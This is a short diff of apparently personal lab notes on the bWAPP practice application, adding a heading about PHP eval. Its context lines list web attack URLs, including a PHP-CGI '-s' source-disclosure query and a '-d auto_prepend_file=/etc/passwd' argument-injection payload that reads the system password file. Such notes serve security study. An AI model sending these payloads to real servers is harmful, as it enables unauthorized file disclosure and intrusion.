@@ -16,3 +16,4 @@ http://59.23.133.107/bWAPP/admin/phpinfo.php
 http://59.23.133.107/bWAPP/admin/?-s
 http://59.23.133.107/bWAPP/admin/?-d+auto_prepend_file%3d/etc/passwd
 ![[Pasted image 20241015095033.png]]
+# PHP Eval Function
